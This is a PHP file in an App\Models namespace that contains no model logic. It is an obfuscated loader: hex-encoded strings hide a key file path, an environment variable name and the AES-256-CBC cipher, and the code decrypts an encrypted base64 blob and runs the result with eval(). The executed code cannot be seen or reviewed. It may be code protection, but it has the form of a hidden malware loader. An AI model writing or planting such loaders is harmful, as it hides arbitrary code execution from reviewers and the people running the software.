<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Kvkj5K/V5nZnFh+gy380vA==');

$c=base64_decode(

'DoUmjFhR3ZtigkKBW+1cyIe/nYbB5iDlu1Q4Wyb2pR49utgoDJCA4weM02tu/mG8lvPhLZ9F5J2t' .
'ATNBsAVe7T679ysS3up4axDINO0svW49D+ZF/jgjNResDIpH6Qx/vexDCJADsR0UVrt4I1ZFKKeH' .
'7kRM01smaDDnMTkAA+GBApypprssq/Sx+s/rD/GJAq3Ii4gUIu1LEyEAzbezAeu4R+BSGXva7KSM' .
'7fgVbXlWjrJdlcTVRP5Rsm1/RMDNdM3uZKCEe9zuo2buAeXYx/9+EagFf14A22ab9Ucp7btyOv/p' .
'/N7e7sk2VSuZg7AyZ+napVJrIvvykgr9W1J6EnrV7vWSwGNMTKg/yf+PCuJeSuZnl552Vyf4aNhY' .
'lVIV9gJf6A+5/Hx949piBRwCBJkAnGtZ9u4h6HKRHBltYa89CEo9boXYMsIY0E9GUUjecc71sT/I' .
'et4n4SrypKPTWWGW+3GZHmItq3TS4JdleMVE8D9LL9DbKqhpTpfx8cAXhfgAqGuJj9d6oE36X8YL' .
'kr1twZi/gYvcfOSQi59Xto9sBDKxBYv4goBoD4BbEE0n8nxoFm6kKYxU0jlGsJ7WxUZuFsaOcRsU' .
'nCWic/bacW6OCbTl/ylInALXvF5GT3by0NehPBeH/VNlgbvODzPpwVsZDnlJ2Qd9+/eA/NRSFZIk' .
'n+fNCklrryx5ItZ6ormSLRQ29Ndf14Na9xyWH00xUPYki8DLGsW61QI3qOq+PkvKULQwkr4s1rdV' .
'djU2MRtJTlfnZfqxJo9v5q+V8NkmBjWNMu325O2Ss2XfzV7tQ4liy6eKuTfueT1VGuMzd4xhYOGc' .
'HMYDtCMsoLhzeoytXsc6WUz2mKVAi7m73rAk6/NxwDZzznihLu1B9KnOcbiiFIG9xWvrgfABiT0h' .
'Qfw/zVWt3wntq2Fgne/hJTKHQZ9QIp3FSzTbhd4oV0Tiz6W8H8r5Vi/WnEIPXd8GXUBJPA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

